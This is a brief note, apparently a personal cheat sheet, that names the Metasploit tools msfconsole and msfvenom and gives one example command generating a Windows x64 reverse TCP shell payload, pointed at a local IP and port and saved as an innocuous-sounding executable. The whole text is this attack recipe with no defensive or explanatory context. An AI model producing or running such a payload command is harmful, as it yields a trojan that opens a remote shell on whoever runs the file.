# (1) msfconsole
(2) msfvenom
- example:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.138.131 LPORT=7777 -f exe > Wise.exe